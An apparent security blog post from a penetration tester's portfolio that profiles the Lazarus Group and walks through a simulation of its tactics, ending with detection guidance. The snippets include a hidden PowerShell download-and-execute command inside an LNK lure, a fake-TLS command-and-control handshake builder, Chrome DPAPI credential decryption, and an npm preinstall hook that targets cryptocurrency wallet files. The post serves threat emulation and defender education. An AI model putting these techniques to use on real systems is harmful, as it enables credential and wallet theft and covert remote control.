<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Portfolio | Nour Alhouseini - Ethical Hacker - Penetration Tester</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
        integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" data-purpose="Layout StyleSheet" title="Web Awesome"
        href="/css/app-wa-3b124ff0e0d7a67cd8c995d0aeb1d15a.css?vsn=d">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/all.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-duotone-solid.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-thin.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-solid.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-regular.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-light.css">
    <link rel="shortcut icon" href="./images/Bring-them-back.png" type="image/x-icon">
    <!-- box icons -->
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>

    <!-- custom css -->
    <link rel="stylesheet" href="../../css/style.css">

    <style>
        .code-block {
            background: rgba(10, 10, 20, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 1rem;
            padding: 2rem 2.4rem;
            margin: 1.5rem 0 2rem;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.35rem;
            line-height: 1.7;
            color: #c9d1d9;
            white-space: pre;
        }

        .technique-table {
            width: 100%;
            border-collapse: collapse;
            margin: 1.5rem 0 2rem;
            font-size: 1.4rem;
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 1rem;
            overflow: hidden;
        }

        .technique-table th {
            text-align: left;
            padding: 1.2rem 1.6rem;
            background: rgba(10, 10, 20, 0.8);
            color: rgba(255, 255, 255, 0.5);
            font-weight: 600;
            font-size: 1.2rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .technique-table td {
            padding: 1.2rem 1.6rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            color: rgba(255, 255, 255, 0.75);
        }

        .technique-table tr:hover td {
            background: rgba(0, 240, 255, 0.03);
        }

        .about-content code {
            font-family: 'JetBrains Mono', monospace;
            background: rgba(10, 10, 20, 0.8);
            padding: 0.2rem 0.6rem;
            border-radius: 0.4rem;
            font-size: 1.4rem;
            color: #00f0ff;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .callout-box {
            border-left: 3px solid #b44aff;
            background: rgba(180, 74, 255, 0.05);
            padding: 2rem 2.4rem;
            border-radius: 0 1rem 1rem 0;
            margin: 2rem 0;
        }

        .section-divider {
            border: none;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.06), transparent);
            margin: 3rem 0;
        }
    </style>
</head>

<body>
    <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>

    <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
    <!-- header design -->
    <header class="header" style="background-color: #1f242df4;">
        <a href="../../index.html" class="logo">Portfolio <sup><i class="fa-classic fa-solid fa-badge-check fa-fw"
                    style="color: #00EEFF;"></i></sup></a>

        <div class='bx bx-menu' id="menu-icon"></div>

        <nav class="navbar">
            <a href="../../index.html#home">&lt;/Home&gt;</a>
            <a href="../../index.html#about">&lt;/About&gt;</a>
            <a href="../../index.html#skills">&lt;/Skills&gt;</a>
            <a href="../../index.html#certificate">&lt;/Education&gt;</a>
            <a href="../../index.html#services">&lt;/Services&gt;</a>
            <a href="../../blogs.html" class="active">&lt;/Blogs&gt;</a>
            <a href="../../index.html#contact">&lt;/Contact&gt;</a>
        </nav>
    </header>

    <!-- blog section -->
    <section class="blog" id="blog">
        <div class="about-img">
            <img src="../../images/Bring-them-back.png" class="machinelogo"
                style="border-radius: 100%; width:20em; height:20em;" alt="Lazarus Group Simulation">
        </div>

        <div class="about-content">

            <h2 class="heading">Lazarus <span>Group</span></h2>

            <div class="blog-meta">
                <h3>Origin: North Korea (DPRK) — State-Sponsored</h3>
                <p><strong>Aliases:</strong> HIDDEN COBRA, Zinc, Diamond Sleet, APT38, BlueNoroff</p>
                <p><strong>Active Since:</strong> 2009 (attributed publicly 2014 — Sony Pictures hack)</p>
                <p><strong>Targets:</strong> Cryptocurrency Exchanges, Financial Institutions, Defense Contractors,
                    Software Developers</p>
                <p><strong>Focus Areas:</strong> Financial Theft, Social Engineering, Supply Chain Attacks, Browser
                    Zero-Days</p>
            </div>

            <!-- Overview -->
            <h3><span>Overview</span></h3>
            <p style="font-size: large;">
                Lazarus Group stole $1.34 billion in cryptocurrency in 2024 alone. They're not just hackers — they're a
                revenue operation for a sanctioned regime. The DPRK's cyber program funds approximately 30% of the
                country's weapons development, and Lazarus is the tip of the spear.
            </p>
            <p style="font-size: large;">
                What sets Lazarus apart is their range. The same organization that hit Sony Pictures with a destructive
                wiper runs sophisticated social engineering campaigns on LinkedIn, deploys browser zero-days against
                cryptocurrency traders, and plants supply chain backdoors in npm packages. This simulation covers their
                four most active TTPs from 2023-2024.
            </p>

            <hr class="section-divider">

            <h3><span>MITRE ATT&CK Mapping</span></h3>

            <table class="technique-table">
                <thead>
                    <tr>
                        <th>Tactic</th>
                        <th>Technique</th>
                        <th>Simulation Tool</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Initial Access</td>
                        <td>T1566.003 — Spearphishing via LinkedIn (Operation Dream Job)</td>
                        <td>dream_job_lure.py</td>
                    </tr>
                    <tr>
                        <td>Execution</td>
                        <td>T1204.002 — Malicious File (trojanized skills assessment)</td>
                        <td>dream_job_lure.py</td>
                    </tr>
                    <tr>
                        <td>Defense Evasion</td>
                        <td>T1014 — Rootkit (FudModule kernel callbacks)</td>
                        <td>fudmodule_rootkit.py</td>
                    </tr>
                    <tr>
                        <td>Command & Control</td>
                        <td>T1071.001 — FakeTLS Protocol over HTTPS</td>
                        <td>faketls_c2.py</td>
                    </tr>
                    <tr>
                        <td>Credential Access</td>
                        <td>T1555.003 — Chrome DPAPI Credential Theft</td>
                        <td>chrome_stealer.cpp</td>
                    </tr>
                    <tr>
                        <td>Initial Access</td>
                        <td>T1195.002 — Supply Chain (npm preinstall hooks)</td>
                        <td>npm_supply_chain/</td>
                    </tr>
                </tbody>
            </table>

            <hr class="section-divider">

            <!-- Operation Dream Job -->
            <h3><span>Operation Dream Job</span></h3>
            <p style="font-size: large;">
                Lazarus's social engineering is some of the most sophisticated in the world. Operation Dream Job targets
                software developers and cryptocurrency engineers through fake recruiter profiles on LinkedIn. The
                operator builds rapport over weeks — real conversations, believable company details (front companies
                like "BlockNovas LLC"), and eventually a "skills assessment" that's actually a trojanized ZIP file.
            </p>
            <p style="font-size: large;">
                The simulation generates realistic lure packages: a ZIP containing a fake PDF job description and an LNK
                file disguised as a code challenge. The LNK file abuses Windows shortcut target parsing — the visible
                target shows <code>notepad.exe</code> but the actual target executes a hidden PowerShell command that
                downloads and runs the second-stage payload.
            </p>

            <div class="code-block"># Generate the social engineering lure package
                class DreamJobLure:
                def __init__(self, target_name, target_role):
                self.company = random.choice([
                "BlockNovas LLC", "SoftGlide Tech", "Angeloper Agency"
                ])
                self.role = f"Senior {target_role} - Remote"
                self.salary = f"${random.randint(180, 350)}k base + token allocation"

                def create_lnk_payload(self):
                # LNK target field shows benign application
                visible_target = r"C:\Windows\notepad.exe"
                # Actual execution hides in LNK arguments
                hidden_cmd = (
                f"powershell -w hidden -ep bypass "
                f"-c \"IEX(New-Object Net.WebClient)."
                f"DownloadString('{self.c2_url}/stage2.ps1')\""
                )</div>

            <hr class="section-divider">

            <!-- FakeTLS C2 -->
            <h3><span>FakeTLS: Protocol-Level Deception</span></h3>
            <p style="font-size: large;">
                This was the most technically interesting piece of the entire project. Lazarus's C2 protocol constructs
                packets that are structurally identical to a TLS 1.2 handshake. SSL inspection appliances see a valid
                ClientHello with real cipher suites, a proper SNI extension pointing to <code>www.microsoft.com</code>,
                and a ServerHello with a legitimate-looking session ID. Everything checks out structurally.
            </p>
            <p style="font-size: large;">
                But it's all fake. The "Application Data" records contain XOR-encrypted JSON commands, not actual
                TLS-protected content. The protocol never completes a real cryptographic handshake. This works because
                most network security appliances validate TLS <em>structure</em> but don't verify the actual
                cryptographic exchange.
            </p>

            <div class="code-block"># Construct a ClientHello that looks identical to Chrome's
                def build_client_hello(self, sni_hostname="www.microsoft.com"):
                # TLS record header
                record = struct.pack('!B', 0x16) # Content type: Handshake
                record += struct.pack('!H', 0x0301) # TLS 1.0 (compat)

                # Handshake header
                hello = struct.pack('!B', 0x01) # ClientHello
                hello += struct.pack('!H', 0x0303) # TLS 1.2

                # 32 bytes random (mimics real browser entropy)
                hello += os.urandom(32)

                # Cipher suites — same order Chrome advertises
                cipher_suites = [
                0xc02c, # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
                0xc02b, # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
                0xc030, # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
                0xc02f, # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                0x009f, # TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
                0x009e, # TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
                ]

                # SNI extension — network logs show "www.microsoft.com"
                sni_ext = self._build_sni_extension(sni_hostname)
                hello += sni_ext</div>

            <p style="font-size: large;">
                Detection requires going beyond structure validation. You need JA3/JA3S fingerprinting to spot the
                mismatch between the claimed browser identity and the actual TLS parameters. Alternatively, full session
                reconstruction that detects the absence of a Certificate message in the handshake sequence reveals the
                deception — a real TLS session always includes the server's certificate.
            </p>

            <hr class="section-divider">

            <!-- Chrome DPAPI Stealer -->
            <h3><span>Chrome DPAPI Credential Theft</span></h3>
            <p style="font-size: large;">
                Lazarus targets cryptocurrency developers specifically because they often have wallet extensions,
                exchange sessions, and private keys accessible through their browser. The C++ stealer extracts Chrome's
                encrypted cookie and credential databases, retrieves the AES key from the <code>Local State</code> file
                (itself encrypted with Windows DPAPI), and decrypts everything in-memory.
            </p>

            <div class="code-block">// Decrypt Chrome's master key via Windows DPAPI
                DATA_BLOB encrypted_key_blob, decrypted_key_blob;
                encrypted_key_blob.pbData = key_bytes.data();
                encrypted_key_blob.cbData = key_bytes.size();

                CryptUnprotectData(
                &encrypted_key_blob, NULL, NULL, NULL, NULL,
                CRYPTPROTECT_UI_FORBIDDEN, &decrypted_key_blob
                );

                // Use decrypted AES-256-GCM key to decrypt cookies/passwords
                // Nonce: first 12 bytes of encrypted value (after "v10" prefix)
                // Tag: last 16 bytes</div>

            <hr class="section-divider">

            <!-- npm Supply Chain -->
            <h3><span>npm Supply Chain Attack</span></h3>
            <p style="font-size: large;">
                Lazarus has been publishing malicious npm packages under names that typosquat popular crypto libraries —
                <code>crypto-price-tracker</code>, <code>web3-wallet-connect</code>. The <code>preinstall</code> hook in
                <code>package.json</code> runs automatically when a developer runs <code>npm install</code>, requiring
                zero interaction.
            </p>
            <p style="font-size: large;">
                The payload detects CI/CD environments by checking for <code>CI</code>, <code>GITHUB_ACTIONS</code>,
                <code>JENKINS_URL</code> environment variables. It enumerates cryptocurrency wallet files
                (<code>.bitcoin</code>, <code>.ethereum</code>, MetaMask extension storage), and exfiltrates over DNS
                queries to avoid HTTPS monitoring.
            </p>

            <div class="code-block">// package.json — preinstall runs before anything else
                {
                "name": "crypto-price-tracker",
                "version": "2.1.4",
                "scripts": {
                "preinstall": "node index.js"
                }
                }

                // index.js payload checks for CI/CD and wallets
                const walletPaths = [
                path.join(home, '.bitcoin', 'wallet.dat'),
                path.join(home, '.ethereum', 'keystore'),
                path.join(home, 'AppData', 'Local', 'Google', 'Chrome',
                'User Data', 'Default', 'Local Extension Settings',
                'nkbihfbeogaeaoehlefnkodbefgpgknn') // MetaMask
                ];</div>

            <hr class="section-divider">

            <!-- Detection -->
            <h3><span>Detection Guidance</span></h3>

            <div class="callout-box">
                <p style="font-size: large;"><strong>Key Challenge:</strong> Lazarus operates across multiple vectors
                    simultaneously — social engineering, protocol deception, supply chain compromise, and credential
                    theft. No single detection covers the full kill chain.</p>
            </div>

            <p style="font-size: large;">
                <strong>What to hunt for:</strong>
            </p>
            <p style="font-size: large;">
                1. JA3 fingerprint mismatches between claimed browser and actual TLS parameters<br>
                2. TLS sessions missing Certificate messages in the handshake sequence<br>
                3. <code>npm audit</code> alerts and preinstall script analysis in CI/CD pipelines<br>
                4. DPAPI calls from non-browser processes accessing Chrome's Local State<br>
                5. DNS TXT queries with high-entropy subdomain labels from developer workstations<br>
                6. LNK files with argument lengths exceeding typical Windows shortcut size
            </p>

            <p style="font-size: large;">
                Full simulation code available on <a style="color:#5EC6FF" href="https://github.com/0xlumos">GitHub</a>.
            </p>

        </div>
    </section>

    <!-- scroll reveal -->
    <script src="https://unpkg.com/scrollreveal"></script>

    <!-- typed js -->
    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>

    <!-- custom js -->
    <script src="../../js/script.js"></script>
</body>

</html>